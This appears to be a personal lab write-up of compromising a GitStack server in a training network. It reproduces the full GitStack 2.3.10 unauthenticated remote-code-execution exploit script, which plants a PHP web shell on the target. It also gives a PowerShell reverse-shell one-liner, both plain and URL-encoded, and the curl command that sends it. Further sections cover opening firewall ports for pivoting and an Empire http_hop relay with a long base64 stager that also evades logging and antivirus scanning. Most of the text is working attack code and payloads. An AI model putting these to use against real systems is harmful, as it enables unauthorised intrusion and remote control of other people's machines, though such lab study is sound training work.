## searchsploit results

```bash
└─$ searchsploit gitstack 
----------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                     |  Path
----------------------------------------------------------------------------------- ---------------------------------
GitStack - Remote Code Execution                                                   | php/webapps/44044.md
GitStack - Unsanitized Argument Remote Code Execution (Metasploit)                 | windows/remote/44356.rb
GitStack 2.3.10 - Remote Code Execution                                            | php/webapps/43777.py
----------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

43777.py

```python
#!/usr/bin/python
# Exploit: GitStack 2.3.10 Unauthenticated Remote Code Execution
# Date: 18.01.2018
# Software Link: https://gitstack.com/
# Exploit Author: Kacper Szurek
# Contact: https://twitter.com/KacperSzurek
# Website: https://security.szurek.pl/
# Category: remote
#   
#1. Description
#  
#$_SERVER['PHP_AUTH_PW'] is directly passed to exec function.
#
#https://security.szurek.pl/gitstack-2310-unauthenticated-rce.html
# 
#2. Proof of Concept
#
import requests
from requests.auth import HTTPBasicAuth
import os
import sys

ip = '10.200.109.150'

# What command you want to execute
command = "whoami"

repository = 'rce'
username = 'rce'
password = 'rce'
csrf_token = 'token'

user_list = []

print "[+] Get user list"
try:
	r = requests.get("http://{}/rest/user/".format(ip))
	user_list = r.json()
	user_list.remove('everyone')
except:
	pass

if len(user_list) > 0:
	username = user_list[0]
	print "[+] Found user {}".format(username)
else:
	r = requests.post("http://{}/rest/user/".format(ip), data={'username' : username, 'password' : password})
	print "[+] Create user"
	
	if not "User created" in r.text and not "User already exist" in r.text:
		print "[-] Cannot create user"
		os._exit(0)

r = requests.get("http://{}/rest/settings/general/webinterface/".format(ip))
if "true" in r.text:
	print "[+] Web repository already enabled"
else:
	print "[+] Enable web repository"
	r = requests.put("http://{}/rest/settings/general/webinterface/".format(ip), data='{"enabled" : "true"}')
	if not "Web interface successfully enabled" in r.text:
		print "[-] Cannot enable web interface"
		os._exit(0)

print "[+] Get repositories list"
r = requests.get("http://{}/rest/repository/".format(ip))
repository_list = r.json()

if len(repository_list) > 0:
	repository = repository_list[0]['name']
	print "[+] Found repository {}".format(repository)
else:
	print "[+] Create repository"

	r = requests.post("http://{}/rest/repository/".format(ip), cookies={'csrftoken' : csrf_token}, data={'name' : repository, 'csrfmiddlewaretoken' : csrf_token})
	if not "The repository has been successfully created" in r.text and not "Repository already exist" in r.text:
		print "[-] Cannot create repository"
		os._exit(0)

print "[+] Add user to repository"
r = requests.post("http://{}/rest/repository/{}/user/{}/".format(ip, repository, username))

if not "added to" in r.text and not "has already" in r.text:
	print "[-] Cannot add user to repository"
	os._exit(0)	

print "[+] Disable access for anyone"
r = requests.delete("http://{}/rest/repository/{}/user/{}/".format(ip, repository, "everyone"))

if not "everyone removed from rce" in r.text and not "not in list" in r.text:
	print "[-] Cannot remove access for anyone"
	os._exit(0)	

print "[+] Create backdoor in PHP"
r = requests.get('http://{}/web/index.php?p={}.git&a=summary'.format(ip, repository), auth=HTTPBasicAuth(username, 'p && echo "<?php system($_POST[\'a\']); ?>" > c:\GitStack\gitphp\exploit_sp00f.php'))
print r.text.encode(sys.stdout.encoding, errors='replace')

print "[+] Execute command"
r = requests.post("http://{}/web/exploit_sp00f.php".format(ip), data={'a' : command})
print r.text.encode(sys.stdout.encoding, errors='replace')

```

![[Screenshot 2021-04-10 at 9.15.33 PM.png]]

Output of whoami command

So changing the command will get us a reverse shell and its a `Windows Machine`


On studying the script, the command which is being executed can be overwritten by manually passing the the command and its stores in a variable `a`

```python
print "[+] Execute command"
r = requests.post("http://{}/web/exploit_sp00f.php".format(ip), data={'a' : command})
print r.text.encode(sys.stdout.encoding, errors='replace')
```

curl results
![[Screenshot 2021-04-10 at 9.46.04 PM.png]]


```powershell
powershell.exe -c "$client = New-Object System.Net.Sockets.TCPClient('10.200.109.200',20000);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```


url-encoded
```
powershell.exe%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%2710.200.109.200%27%2C20000%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22
```
 
 Here we are not able to get a reverse shell but the command is executed.
 
 ```bash
 └─$ curl http://10.200.109.150/web/exploit_sp00f.php -d "a=powershell.exe%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%2710.200.109.200%27%2C20000%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22"
 ```
 
 So this might be due to the firewall on the machines.
 
 Starting with centOS as we are pivitoing through CentOS only!
 
 from here https://stackoverflow.com/questions/24729024/open-firewall-port-on-centos-7 we can open ports 
 
 `firewall-cmd --zone=public --add-port=20000/tcp`
 
 Here opening a port is not enough, we have to forward that port to us too.

now after that send the payload and listen on rev shell on the prod server
 
![[Screenshot 2021-04-10 at 11.03.44 PM.png]]

got the reverse shell
![[Screenshot 2021-04-10 at 11.03.31 PM.png]]

now here we are having a stable shell otherwise we can use socat for reverse shell forwarding 

----

### Getting Reverse shell using Empire

- 1st shell
	`uselistener http`
	set the config and `execute`
	I have set the name to GitServer
	![[Screenshot 2021-04-30 at 6.24.27 PM.png]]

- 2nd shell
	start a http_hop
	`uselistener http_hop`
	set the port of the website (prod server. from there we will the the shell)
	![[Screenshot 2021-04-30 at 6.26.28 PM.png]]
	
	set the Redirect Listener to the GitServer
	![[Screenshot 2021-04-30 at 6.27.53 PM.png]]
	and `execute`
	and it will create the files in /tmp/ folder, which we will host in the prod server and forward the shell to our main hacking machine
	
- 3rd shell
	`usestager multi/launcher`
	`set Listener http_hop`
	`execute`
	here we are generating the powershell payload the get shell to the http_hop listener in the git-prod server 
	![[Screenshot 2021-04-30 at 6.30.54 PM.png]]
	
	![[Screenshot 2021-04-30 at 6.42.22 PM.png]]
	
	```powreshell
	powershell -noP -sta -w 1 -enc  SQBmACgAJABQAFMAVgBFAFIAUwBpAG8AbgBUAEEAYgBsAEUALgBQAFMAVgBFAFIAUwBpAE8AbgAuAE0AQQBKAG8AcgAgAC0AZwBlACAAMwApAHsAJABiAGUAMgBlADMAPQBbAFIAZQBmAF0ALgBBAHMAcwBFAE0AYgBsAFkALgBHAEUAVABUAHkAcABFACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AVQB0AGkAbABzACcAKQAuACIARwBlAFQARgBJAGUAYABsAEQAIgAoACcAYwBhAGMAaABlAGQARwByAG8AdQBwAFAAbwBsAGkAYwB5AFMAZQB0AHQAaQBuAGcAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQA7AEkARgAoACQAYgBFADIARQAzACkAewAkADgARgBhADEAYgA9ACQAYgBFADIARQAzAC4ARwBlAFQAVgBBAGwAVQBFACgAJABuAHUATABsACkAOwBJAGYAKAAkADgAZgBBADEAQgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdACkAewAkADgAZgBBADEAYgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAA4AGYAQQAxAEIAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQBbACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnAF0APQAwAH0AJABWAGEATAA9AFsAQwBPAGwATABlAGMAVABJAG8AbgBTAC4ARwBFAE4AZQByAEkAYwAuAEQASQBDAFQASQBPAE4AYQByAFkAWwBTAHQAUgBJAG4AZwAsAFMAWQBTAFQAZQBtAC4ATwBiAEoAZQBDAHQAXQBdADoAOgBuAGUAdwAoACkAOwAkAHYAQQBMAC4AQQBkAEQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkAFYAQQBMAC4AQQBkAGQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQAOABGAGEAMQBiAFsAJwBIAEsARQBZAF8ATABPAEMAQQBMAF8ATQBBAEMASABJAE4ARQBcAFMAbwBmAHQAdwBhAHIAZQBcAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwBcAFAAbwB3AGUAcgBTAGgAZQBsAGwAXABTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAkAHYAYQBsAH0ARQBsAFMARQB7AFsAUwBjAFIASQBwAFQAQgBMAE8AYwBLAF0ALgAiAEcAZQB0AEYASQBlAGAATABkACIAKAAnAHMAaQBnAG4AYQB0AHUAcgBlAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAdABWAGEATABVAEUAKAAkAE4AdQBMAEwALAAoAE4AZQB3AC0ATwBiAGoARQBjAHQAIABDAE8ATABMAGUAYwBUAGkAbwBuAFMALgBHAGUAbgBFAHIAaQBDAC4ASABhAHMAaABTAEUAdABbAHMAVABSAEkATgBnAF0AKQApAH0AJABSAEUARgA9AFsAUgBFAGYAXQAuAEEAUwBzAGUATQBiAGwAeQAuAEcARQB0AFQAeQBwAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpACcAKwAnAFUAdABpAGwAcwAnACkAOwAkAFIAZQBmAC4ARwBFAFQARgBpAGUATABEACgAJwBhAG0AcwBpAEkAbgBpAHQARgAnACsAJwBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAGUAVABWAEEATABVAEUAKAAkAE4AVQBsAGwALAAkAFQAcgB1AEUAKQA7AH0AOwBbAFMAWQBzAFQARQBNAC4ATgBFAFQALgBTAEUAUgBWAEkAQwBFAFAATwBJAG4AVABNAGEAbgBhAGcARQByAF0AOgA6AEUAWABQAGUAQwB0ADEAMAAwAEMATwBuAHQASQBuAHUARQA9ADAAOwAkAEUANgBDAGMANQA9AE4AZQB3AC0ATwBiAGoARQBjAFQAIABTAHkAcwB0AEUAbQAuAE4ARQBUAC4AVwBFAEIAQwBsAGkARQBOAFQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABFADYAQwBDADUALgBIAGUAYQBEAGUAcgBTAC4AQQBkAEQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJABlADYAYwBjADUALgBQAFIATwBYAHkAPQBbAFMAWQBTAFQAZQBNAC4ATgBFAFQALgBXAEUAYgBSAGUAcQB1AGUAcwBUAF0AOgA6AEQAZQBGAGEAVQBMAHQAVwBlAGIAUABSAE8AWABZADsAJABlADYAYwBjADUALgBQAHIATwBYAFkALgBDAFIAZQBEAEUATgBUAEkAQQBMAFMAIAA9ACAAWwBTAFkAcwBUAEUATQAuAE4AZQBUAC4AQwBSAEUARABFAE4AVABJAEEATABDAEEAYwBoAEUAXQA6ADoARABlAGYAYQBVAEwAdABOAGUAVAB3AE8AcgBLAEMAUgBlAGQARQBuAHQAaQBBAGwAcwA7ACQASwA9AFsAUwBZAFMAdABFAE0ALgBUAGUAeAB0AC4ARQBuAGMATwBEAEkATgBnAF0AOgA6AEEAUwBDAEkASQAuAEcAZQB0AEIAWQBUAGUAcwAoACcAZwBiACwAfgAjAD4AMQBQAHUAZgApAFMATgBoADwAXgBFAHsAUQBVADQAMgB3AFYANwBaAHYAegBpAEQAWwArACcAKQA7ACQAUgA9AHsAJABEACwAJABLAD0AJABBAFIARwBzADsAJABTAD0AMAAuAC4AMgA1ADUAOwAwAC4ALgAyADUANQB8ACUAewAkAEoAPQAoACQASgArACQAUwBbACQAXwBdACsAJABLAFsAJABfACUAJABLAC4AQwBvAHUAbgB0AF0AKQAlADIANQA2ADsAJABTAFsAJABfAF0ALAAkAFMAWwAkAEoAXQA9ACQAUwBbACQASgBdACwAJABTAFsAJABfAF0AfQA7ACQARAB8ACUAewAkAEkAPQAoACQASQArADEAKQAlADIANQA2ADsAJABIAD0AKAAkAEgAKwAkAFMAWwAkAEkAXQApACUAMgA1ADYAOwAkAFMAWwAkAEkAXQAsACQAUwBbACQASABdAD0AJABTAFsAJABIAF0ALAAkAFMAWwAkAEkAXQA7ACQAXwAtAEIAeABPAHIAJABTAFsAKAAkAFMAWwAkAEkAXQArACQAUwBbACQASABdACkAJQAyADUANgBdAH0AfQA7ACQARQA2AGMAYwA1AC4ASABFAEEAZABFAFIAcwAuAEEARABkACgAIgBDAG8AbwBrAGkAZQAiACwAIgBzAGUAcwBzAGkAbwBuAD0ARwBYAHEARQBFADUAdgBoADMAbwBWAFYAcAB2AE4AUwBFAHgAdgBoAHYAegBkAGUAaABaAFUAPQAiACkAOwAkAHMAZQByAD0AJAAoAFsAVABFAFgAdAAuAEUAbgBDAE8ARABJAG4AZwBdADoAOgBVAG4AaQBDAE8AZABlAC4ARwBlAFQAUwBUAHIASQBuAEcAKABbAEMAbwBuAFYAZQBSAFQAXQA6ADoARgBSAG8ATQBCAEEAUwBFADYANABTAFQAUgBpAG4ARwAoACcAYQBBAEIAMABBAEgAUQBBAGMAQQBBADYAQQBDADgAQQBMAHcAQQB4AEEARABBAEEATABnAEEAeQBBAEQAQQBBAE0AQQBBAHUAQQBEAGcAQQBPAFEAQQB1AEEARABJAEEATQBBAEEAdwBBAEQAbwBBAE0AZwBBAHcAQQBEAEEAQQBNAEEAQQB3AEEAQQA9AD0AJwApACkAKQA7ACQAdAA9ACcALwBsAG8AZwBpAG4ALwBwAHIAbwBjAGUAcwBzAC4AcABoAHAAJwA7ACQAaABvAHAAPQAnAGgAdAB0AHAAXwBoAG8AcAAnADsAJABkAEEAdABBAD0AJABFADYAYwBjADUALgBEAG8AdwBuAGwATwBBAEQARABhAHQAYQAoACQAcwBFAFIAKwAkAHQAKQA7ACQASQBWAD0AJABkAGEAVABBAFsAMAAuAC4AMwBdADsAJABkAGEAdABBAD0AJABEAEEAVABBAFsANAAuAC4AJABEAGEAVABBAC4AbABlAE4AZwBUAEgAXQA7AC0ASgBPAGkATgBbAEMAaABBAFIAWwBdAF0AKAAmACAAJABSACAAJABkAGEAVABBACAAKAAkAEkAVgArACQASwApACkAfABJAEUAWAA=
	```
	
	----
	Mini Road-Map
	
		powershell payload using the stager(windows git server) -> Prod-Server(http_hop) -> Local HTTP Listener (NAME set my me: GitServer)
		
	----- 

and ssh into the prod server and host the files generated in the /tmp/ folder
![[Screenshot 2021-04-30 at 6.39.15 PM.png]]

initially the files wont be called just a `Ctrl-C to quit.`  
![[Screenshot 2021-04-30 at 6.40.00 PM.png]]


and using the exploit of RCE in the windows git server we send the powershell payload with url-encoded it
![[Screenshot 2021-04-30 at 6.41.26 PM.png]]

and finally after executing all correctly we the listener back on the local http listener
![[Screenshot 2021-04-30 at 6.38.23 PM.png]]

------
	Here will still be needing to forward the port to execute the powershell code and open a port in the prod server
	
----

